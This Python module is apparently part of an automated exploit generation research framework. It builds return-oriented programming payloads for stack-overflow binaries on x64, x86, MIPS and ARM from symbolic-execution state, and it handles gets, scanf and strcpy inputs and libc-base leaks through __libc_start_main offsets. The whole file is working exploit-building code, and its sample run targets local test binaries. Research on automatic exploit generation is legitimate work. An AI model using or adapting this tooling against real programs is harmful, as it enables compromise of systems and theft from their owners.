"""
author : 4everdestiny
create_time : 2022.3.2
description : this is the code to generate Return Oriented Programming payload
1. check the protection
2. generate the exploit
input : binary path
output : the exploit needed
"""
import sys

from exploit_generation.PayloadList import PayloadList
from exploit_generation.PayloadElement import PayloadElement
from exploit_generation.SinglePayload import SinglePayload
from exploit_generation.ProtectionInformation import ProtectionInformation
from exploit_generation.ROPGenerationLinuxX64 import ROPGenerationLinuxX64
from exploit_generation.ROPGenerationLinuxX86 import ROPGenerationLinuxX86
from exploit_generation.ROPGenerationLinuxMips32 import ROPGenerationLinuxMips32
from exploit_generation.ROPGenerationLinuxArm import ROPGenerationLinuxArm
from log import log
import pwn

log = log.Log()


class ROPGeneration:
    def __init__(self, binarypath, needlength=0,
                 avoidchars="0a", prefixlength=0, needline=False,
                 libcpath="../binaries/libcs/libc-2.27.so",
                 statelog=None, function_helper=None
                 ):
        self.binarypath = binarypath
        self.libcpath = libcpath
        self.libc = pwn.ELF(self.libcpath)
        self.needlength = needlength
        self.avoidchars = avoidchars
        self.prefixlength = prefixlength
        self.needline = needline
        self.payloadlist = PayloadList()
        self.statelog = statelog
        protection = ProtectionInformation(self.binarypath).GetProtection()
        self.NX = protection["NX"]
        self.arch = protection["arch"]
        self.extrafunction = ""
        self.load_general_single_payload_content = b""
        self.ropgenerator = None
        self.exploit_method = ""
        self.function_helper = function_helper

    def GetPayloadList(self):
        """
        return the payload list
        :return: payload list
        """
        return self.payloadlist

    def ParseStatelogPath(self):
        """
        solve the path problem in statelog, generally use the dumps(0)
        as the input path
        :return: None
        """
        if self.statelog is None:
            log.Exception("statelog is None, please check it")
        fmtstatelog = self.statelog.pre_statelog
        if fmtstatelog is not None:
            pre_input = fmtstatelog.state.posix.dumps(0)
            pre_input_length = len(pre_input)
            pre_output = fmtstatelog.state.posix.dumps(1)
            pre_output_length = len(pre_output)
        else:
            pre_input_length = 0
            pre_output_length = 0
        now_input = self.statelog.state.posix.dumps(0)[pre_input_length:]
        output_info = self.statelog.state.posix.dumps(1)[pre_output_length:]
        self.load_general_single_payload_content = self.ropgenerator.load_general_single_payload_content
        if self.extrafunction == "gets":
            if self.load_general_single_payload_content in now_input:
                index = now_input.index(self.load_general_single_payload_content) + len(self.load_general_single_payload_content)
                # now_input[index] = b"\n"
                now_input = now_input[:index] + b"\n"
            else:
                log.Exception("cannot find the single payload info in input, please check in ParseStatelogPath")
                return False
        if not self.ropgenerator.have_replace:
            final_payload = []
            final_payload.append(PayloadElement(
                datavalue=now_input, adjustinfo=None, datatype="bytes"
            ))
            singelpayload = SinglePayload(
                content=final_payload, length=len(now_input),
                prefixlength=0
            )
        else:
            final_payload = [now_input]
            for replace_data in self.ropgenerator.replace_data:
                data = replace_data[0]
                singel_payload_replace = replace_data[1]
                for i in range(len(final_payload)):
                    if type(final_payload[i]) != bytes:
                        continue
                    if data in final_payload[i]:
                        temp_input = final_payload[i]
                        temp_content = []
                        temp_content.append(temp_input[:temp_input.index(data)])
                        temp_content.append(singel_payload_replace)
                        temp_content.append(temp_input[temp_input.index(data) + len(data):])
                        if i + 1 < len(final_payload):
                            final_payload = final_payload[:i] + temp_content + final_payload[i + 1:]
                        else:
                            final_payload = final_payload[:i] + temp_content
            final_payload_real = []
            for content in final_payload:
                if type(content) == bytes:
                    if len(content) != 0:
                        final_payload_real.append(PayloadElement(
                            datavalue=content, adjustinfo=None, datatype="bytes"
                        ))
                else:
                    final_payload_real.extend(content.GetContent())
            singelpayload = SinglePayload(
                content=final_payload_real, length=len(now_input),
                prefixlength=0
            )
                # self.payloadlist.AppendPayload(singelpayload)
        if len(output_info) != 0:
            singelpayload.AddRecvInfo(
                type="string", recv_index=[0, output_info], func="bytes", adjustoffset=None
            )
        if self.statelog.needrecvlibc:
            if self.arch == "i386":
                if self.statelog.need_send:
                    self.statelog.need_send_payload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 4], func="u32",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
                else:
                    singelpayload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 4], func="u32",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
            elif self.arch == "amd64":
                if self.statelog.need_send:
                    self.statelog.need_send_payload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 6], func="u64",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
                else:
                    singelpayload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 6], func="u64",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
            elif self.arch == "mips":
                if self.statelog.need_send:
                    self.statelog.need_send_payload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 4], func="u32",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
                else:
                    singelpayload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 4], func="u32",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
            else:
                log.Exception("unknown architecture in ParseStatelogPath")
                return False
        self.payloadlist.AppendPayload(singelpayload)
        if self.statelog.need_send:
            self.payloadlist.AppendPayload(self.statelog.need_send_payload)

    def ParseScanfPrefixPayload(self):
        """
        for scanf function, we need to parse the format
        such as "%d %s %c", we need to give a prefix and suffix payload
        :return: None
        """
        if self.statelog is None:
            log.Exception("statelog is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        if scanfinfo is None:
            log.Exception("statelog is None, please check it")
            return False
        formats = list("dscuoxX")
        for i in range(scanfinfo.overflow_index):
            #re.findall(r"%\d*[dscuoxX]", formatstring)
            format = scanfinfo.formats[i][-1]
            if format in formats:
                payload_string = b"\x30\n" #0\n
                payload = [PayloadElement(
                    datavalue=payload_string, adjustinfo=None, datatype="bytes")]
                singelpayload = SinglePayload(
                    content=payload, length=len(payload_string),
                    prefixlength=0
                )
                self.payloadlist.AppendPayload(singelpayload)
            else:
                log.Exception("format error in scanf:{format}".format(format=scanfinfo.formats[i]))

    def ParseScanfSuffixPayload(self):
        """
        for scanf function, we need to parse the format
        such as "%d %s %c", we need to give a prefix and suffix payload
        :return: None
        """
        if self.statelog is None:
            log.Exception("statelog is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        if scanfinfo is None:
            log.Exception("statelog is None, please check it")
            return False
        formats = list("dscuoxX")
        for i in range(scanfinfo.overflow_index + 1, len(scanfinfo.formats)):
            #re.findall(r"%\d*[dscuoxX]", formatstring)
            format = scanfinfo.formats[i][-1]
            if format in formats:
                payload_string = b"\x30\n" #0\n
                payload = [PayloadElement(
                    datavalue=payload_string, adjustinfo=None, datatype="bytes")]
                singelpayload = SinglePayload(
                    content=payload, length=len(payload_string),
                    prefixlength=0
                )
                if i == len(scanfinfo.formats) - 1:
                    return singelpayload
                else:
                    self.payloadlist.AppendPayload(singelpayload)
            else:
                log.Exception("format error in scanf:{format}".format(format=scanfinfo.formats[i]))

    def ParseStrcpyPrefixPayload(self):
        """
        for strcpy function, we need to parse the prefix input
        :return: None
        """
        if self.statelog is None:
            log.Exception("statelog is None, please check it")
            return False
        strcpyinfo = self.statelog.strcpyinfo
        if strcpyinfo is None:
            log.Exception("strcpyinfo is None, please check it")
            return False
        begin_index = strcpyinfo.prefix_payload_begin_index
        end_index = strcpyinfo.prefix_payload_end_index
        prefix_input_length = end_index - begin_index
        if prefix_input_length != 0:
            fd = strcpyinfo.file_fd
            all_input = self.statelog.state.posix.dumps(fd)
            payload = [PayloadElement(
                datavalue=all_input[begin_index:end_index], adjustinfo=None, datatype="bytes")]
            singelpayload = SinglePayload(
                content=payload, length=prefix_input_length,
                prefixlength=0
            )
            if fd != sys.stdin.fileno():
                singelpayload.PlacePayloadInFile(file_name=self.statelog.state.posix.fd[fd].file.name)
            self.payloadlist.AppendPayload(singelpayload)

    def AnalyseBadBytes(self, badbytes=b""):
        """
        analyse the function info from the badbytes
        :param badbytes: the badbytes parsed from the state
        :return: None
        """
        if badbytes == b"\n":
            # here means we might enter gets function
            self.avoidchars = badbytes
            self.extrafunction = "gets"

    def ParseBadBytesForGeneralCheck(self):
        """
        here we need to analyse the bad bytes for general check
        and use these bad bytes to indicate the function used
        :return: None
        """
        if self.statelog.functionname != "general_check":
            return None
        state = self.statelog.state
        if self.arch == "amd64":
            rip = state.regs.rip
            # rsp = copy_state.regs.rsp
            if not rip.symbolic:
                log.Exception("eip is not symbolic, please check it in ParseBadBytesForGeneralCheck")
            badbytes = b""
            for badbyte in b"\x00\n\x20":
                test_input = badbyte.to_bytes(length=1, byteorder="little") * 8
                constrained_parameter_desired_value = test_input
                constraint_expression = rip == constrained_parameter_desired_value
                # temp_copy_state.add_constraints(constraint_expression)
                if not state.satisfiable(extra_constraints=[constraint_expression]):
                    badbytes += badbyte.to_bytes(length=1, byteorder="little")
            self.AnalyseBadBytes(badbytes=badbytes)
            return True
        elif self.arch == "i386":
            eip = state.regs.eip
            # esp = copy_state.regs.esp
            if not eip.symbolic:
                log.Exception("eip is not symbolic, please check it in ParseBadBytesForGeneralCheck")
            badbytes = b""
            for badbyte in b"\x00\n\x20":
                test_input = badbyte.to_bytes(length=1, byteorder="little") * 4
                constrained_parameter_desired_value = test_input
                constraint_expression = eip == constrained_parameter_desired_value
                # state.add_constraints(constraint_expression)
                if not state.satisfiable(extra_constraints=[constraint_expression]):
                    badbytes += badbyte.to_bytes(length=1, byteorder="little")
            self.avoidchars = badbytes
            self.AnalyseBadBytes(badbytes=badbytes)
            return True
        elif self.arch == "mips":
            eip = state.regs.ip
            # esp = copy_state.regs.esp
            if not eip.symbolic:
                log.Exception("eip is not symbolic, please check it in ParseBadBytesForGeneralCheck")
            badbytes = b""
            for badbyte in b"\x00\n\x20":
                test_input = badbyte.to_bytes(length=1, byteorder="little") * 4
                constrained_parameter_desired_value = test_input
                constraint_expression = eip == constrained_parameter_desired_value
                # state.add_constraints(constraint_expression)
                if not state.satisfiable(extra_constraints=[constraint_expression]):
                    badbytes += badbyte.to_bytes(length=1, byteorder="little")
            self.avoidchars = badbytes
            self.AnalyseBadBytes(badbytes=badbytes)
            return True
        else:
            log.Exception("unknown arch, please check it")
            return False

    def GeneratePayload(self):
        """
        generate the payload according to the state or binary
        supported for architeture: amd64, i386
        :return:
        """
        # protection = ProtectionInformation.ProtectionInformation(self.binarypath).GetProtection()
        self.ParseBadBytesForGeneralCheck()
        func_list = ["strcpy", "strncpy"]
        if self.arch == "amd64":
            self.ropgenerator = ROPGenerationLinuxX64(
                binarypath=self.binarypath, needlength=self.needlength,
                avoidchars=self.avoidchars, prefixlength=self.prefixlength,
                needline=self.needline, libcpath=self.libcpath,
                statelog=self.statelog, function_helper=self.function_helper
            )
            can_generate = self.ropgenerator.GeneratePayload_X64()
            if not can_generate:
                log.Exception("payload generate error in GeneratePayload_X64")
                return False
            self.exploit_method = self.ropgenerator.exploit_method
            # self.payloadlist.MergePayloadList(ropgenerator.GetPayloadList())
        elif self.arch == "i386":
            self.ropgenerator = ROPGenerationLinuxX86(
                binarypath=self.binarypath, needlength=self.needlength,
                avoidchars=self.avoidchars, prefixlength=self.prefixlength,
                needline=self.needline, libcpath=self.libcpath,
                statelog=self.statelog, function_helper=self.function_helper
            )
            can_generate = self.ropgenerator.GeneratePayload_X86()
            if not can_generate:
                log.Exception("payload generate error in GeneratePayload_X86")
                return False
            self.exploit_method = self.ropgenerator.exploit_method
        elif self.arch == "mips":
            self.ropgenerator = ROPGenerationLinuxMips32(
                binarypath=self.binarypath, needlength=self.needlength,
                avoidchars=self.avoidchars, prefixlength=self.prefixlength,
                needline=self.needline, libcpath=self.libcpath,
                statelog=self.statelog#, function_helper=self.function_helper
            )
            can_generate = self.ropgenerator.GeneratePayload_Mips32()
            if not can_generate:
                log.Exception("payload generate error in GeneratePayload_X86")
                return False
            self.exploit_method = self.ropgenerator.exploit_method
        elif self.arch == "arm":
            self.ropgenerator = ROPGenerationLinuxArm(
                binarypath=self.binarypath, needlength=self.needlength,
                avoidchars=self.avoidchars, prefixlength=self.prefixlength,
                needline=self.needline, libcpath=self.libcpath,
                statelog=self.statelog#, fuction_helper=self.function_helper
            )
            can_generate = self.ropgenerator.GeneratePayload_Arm()
            if not can_generate:
                log.Exception("payload generate error in GeneratePayload_X86")
                return False
            self.exploit_method = self.ropgenerator.exploit_method
        else:
            log.Exception("unknown architecuture in GeneratePayload, please check it")
            return False
        if self.statelog.functionname not in func_list:
            self.ParseStatelogPath()
        if self.statelog.functionname == "scanf":
            self.ParseScanfPrefixPayload()
        if self.statelog.functionname in func_list:
            self.ParseStrcpyPrefixPayload()
        self.payloadlist.MergePayloadList(self.ropgenerator.GetPayloadList())
        return self.payloadlist


if __name__ == '__main__':
    """
    binarypath = "../binaries/stack_overflow/level1/test1/level1_test1"
    ROPGeneration = ROPGeneration(binarypath)
    payload = ROPGeneration.GeneratePayload()
    print(payload)
    """
    binarypath = "../binaries/stack_overflow/dynamic/test4/dynamic_test4"
    ROPGeneration = ROPGeneration(binarypath, needlength=0x100)
    payload = ROPGeneration.GeneratePayload()
    print(payload.GetList()[0])
